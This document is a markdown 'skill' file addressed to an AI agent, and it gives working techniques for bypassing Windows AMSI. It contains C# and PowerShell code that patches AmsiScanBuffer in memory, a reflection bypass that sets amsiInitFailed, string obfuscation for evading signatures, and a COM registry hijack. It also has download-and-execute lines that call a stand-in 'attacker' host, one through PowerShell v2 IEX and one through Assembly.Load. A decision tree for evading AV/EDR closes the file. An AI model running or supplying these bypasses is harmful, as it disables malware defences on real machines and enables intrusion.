# AMSI Bypass Techniques — Detailed Patterns

> **AI LOAD INSTRUCTION**: Load this for detailed AMSI bypass code patterns, PowerShell-specific bypasses, .NET AMSI bypass, and Constrained Language Mode escape. Assumes the main [SKILL.md](./SKILL.md) is already loaded for general AV/EDR evasion concepts.

---

## 1. AMSI ARCHITECTURE

```
PowerShell / .NET / VBScript / JScript
        │
        ▼
    amsi.dll (loaded in process)
        │
        ├── AmsiInitialize()    → Create AMSI context
        ├── AmsiOpenSession()   → Open scan session
        ├── AmsiScanBuffer()    → Scan content ← PRIMARY TARGET
        ├── AmsiScanString()    → Scan string
        └── AmsiCloseSession()  → Close session
        │
        ▼
    AV Engine (Windows Defender / third-party)
        │
        ▼
    AMSI_RESULT (Clean / Malware / Not Detected)
```

**Key insight**: Patching `AmsiScanBuffer` to always return "clean" bypasses all AMSI-enabled scanning.

---

## 2. MEMORY PATCHING — AmsiScanBuffer

### Concept

Overwrite the first bytes of `AmsiScanBuffer` so it returns `AMSI_RESULT_CLEAN` (0) immediately.

### PowerShell Implementation (Obfuscated)

```powershell
# Base pattern — variable names must be randomized per use
$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*siUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
# ... patching logic varies by implementation

# The actual patch writes bytes to AmsiScanBuffer:
# x64: mov eax, 0x80070057 (E_INVALIDARG); ret
# Bytes: B8 57 00 07 80 C3
```

### C# Implementation

```csharp
// Get amsi.dll handle and AmsiScanBuffer address
IntPtr amsiDll = LoadLibrary("amsi.dll");
IntPtr amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");

// Change memory protection to writable
VirtualProtect(amsiScanBufferAddr, (UIntPtr)6, 0x40, out uint oldProtect);

// Patch: mov eax, 0x80070057; ret (returns E_INVALIDARG)
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);

// Restore protection
VirtualProtect(amsiScanBufferAddr, (UIntPtr)6, oldProtect, out _);
```

### Obfuscation Techniques for the Patch

```powershell
# Avoid string "AmsiScanBuffer" (itself flagged):

# XOR obfuscation
$xorKey = 0x42
$encBytes = [byte[]]@(0x23,0x2F,0x31,...) # XOR-encrypted function name

# Base64 split
$p1 = "Am"; $p2 = "si"; $p3 = "Sc"; $p4 = "anBuf"; $p5 = "fer"
$funcName = "$p1$p2$p3$p4$p5"

# Reverse string
$rev = "reffuBnacSimA"
$funcName = -join ($rev[-1..-($rev.Length)])
```

---

## 3. REFLECTION-BASED BYPASS

### Set amsiInitFailed

```powershell
# Force AMSI initialization failure via reflection
# The field name and class are obfuscated because they're flagged
$t = [Ref].Assembly.GetType(('System.Management.Automation.{0}' -f ('Am','siUtils' -join '')))
$f = $t.GetField(('am','siIn','itFailed' -join ''), 'NonPublic,Static')
$f.SetValue($null, $true)
# All subsequent AMSI scans skip (init "already failed")
```

### Disable AMSI via Session State

```powershell
# Remove AMSI providers from session
$utils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $utils.GetField('amsiSession', 'NonPublic,Static')
$session = $field.GetValue($null)
# Nullify session → AMSI has no active session to scan with
```

---

## 4. POWERSHELL-SPECIFIC BYPASSES

### PowerShell v2 Downgrade

```cmd
# If .NET Framework 2.0/3.5 is installed, PS v2 has no AMSI
powershell -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# Check if v2 is available
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
```

### PowerShell Runspace (Bypass Script Block Logging + AMSI)

```csharp
// C# — create PowerShell runspace without AMSI
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
// Patch AMSI in this runspace
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
ps.AddScript("whoami");
var results = ps.Invoke();
```

### Constrained Language Mode Bypass

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass 1: PowerShell v2 (no CLM in v2)
powershell -Version 2

# Bypass 2: Run from unmanaged code (C++/C# loader)
# CLM is enforced per-process; unmanaged loader can create unrestricted runspace

# Bypass 3: WDAC/AppLocker misconfiguration
# Find writable directory in allowed path → execute from there
```

---

## 5. .NET AMSI BYPASS

### In-Assembly Bypass (Before Tool Execution)

```csharp
// Patch AmsiScanBuffer before loading the target .NET tool
static void PatchAmsi()
{
    IntPtr lib = LoadLibrary("amsi.dll");
    IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");

    uint oldProtect;
    VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

    // mov eax, 0x80070057 (E_INVALIDARG); ret
    Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);

    VirtualProtect(addr, (UIntPtr)6, oldProtect, out _);
}

// Call PatchAmsi() before Assembly.Load() of the target tool
PatchAmsi();
byte[] toolBytes = DownloadAndDecrypt("https://attacker/tool.enc");
Assembly.Load(toolBytes).EntryPoint.Invoke(null, new object[] { args });
```

### VBScript/JScript AMSI Bypass

```vbscript
' VBScript — WScript.Shell execution (AMSI may not cover all code paths)
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd.exe /c whoami", 0, True
```

### Office Macro AMSI Bypass

```vba
' VBA macros are scanned by AMSI in Office 365+
' Bypass: use Win32 API directly (VirtualAlloc + RtlMoveMemory + CreateThread)
' AMSI scans the VBA source, not the API calls at runtime

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (...)
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (...)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (...)
```

---

## 6. COM-BASED AMSI BYPASS

### AMSI COM Server Hijack

AMSI uses a COM object (CLSID `{fdb00e52-a214-4aa1-8fba-4357bb0072ec}`). Redirecting it disables AMSI.

```cmd
# Create registry redirect (per-user, no admin needed)
reg add "HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32" /ve /d "C:\temp\fake_amsi.dll" /f

# fake_amsi.dll exports AmsiScanBuffer returning S_OK + AMSI_RESULT_CLEAN
```

---

## 7. HARDWARE BREAKPOINT BYPASS

Use hardware breakpoints to intercept `AmsiScanBuffer` without modifying memory.

```csharp
// Set hardware breakpoint on AmsiScanBuffer
// When hit: exception handler modifies return value to AMSI_RESULT_CLEAN
// Advantage: no memory modification → bypasses integrity checks

CONTEXT ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
ctx.Dr0 = (ulong)amsiScanBufferAddr;  // Break address
ctx.Dr7 = 0x00000001;                  // Enable DR0
SetThreadContext(hThread, ref ctx);

// Vectored Exception Handler modifies RAX (return value) to 0
AddVectoredExceptionHandler(1, ExceptionHandler);
```

**Advantage**: No code patching, passes memory integrity checks used by some EDRs.

---

## 8. AMSI BYPASS DECISION TREE

```
Need to bypass AMSI
│
├── PowerShell payload?
│   ├── .NET 2.0 available?
│   │   └── PS v2 downgrade (simplest, no AMSI in v2) (§4)
│   ├── Can run C# loader?
│   │   └── Patch AmsiScanBuffer from C# before PS (§2)
│   ├── Pure PowerShell bypass needed?
│   │   ├── Reflection: set amsiInitFailed (§3)
│   │   ├── Memory patch AmsiScanBuffer (§2)
│   │   └── Obfuscate all trigger strings
│   └── Bypass detected by AV?
│       ├── Hardware breakpoint method (§7)
│       └── COM server hijack (§6)
│
├── .NET assembly (C# tool)?
│   ├── AMSI scanning Assembly.Load?
│   │   ├── Patch AMSI before load (§5)
│   │   ├── ETW bypass to hide load event
│   │   └── Convert to shellcode via Donut (avoid .NET AMSI entirely)
│   └── CLM blocking execution?
│       ├── PS v2 downgrade (§4)
│       └── Unmanaged loader (C++/C# P/Invoke)
│
├── VBScript / JScript?
│   ├── AMSI scans script content → obfuscate heavily
│   └── Use WScript.Shell for execution (less AMSI coverage)
│
├── Office Macro?
│   ├── VBA AMSI bypass: use Win32 API directly (§5)
│   └── Obfuscate macro source code
│
├── Multiple AMSI bypasses chained?
│   └── 1. Obfuscate strings → 2. Patch AMSI → 3. Load payload
│       (each layer adds resilience)
│
└── EDR detects the bypass itself?
    ├── Vary bypass method per engagement
    ├── Use hardware breakpoints (no memory modification) (§7)
    ├── Custom-develop bypass (modify known patterns)
    └── Consider fileless Living-off-the-Land approach instead
```
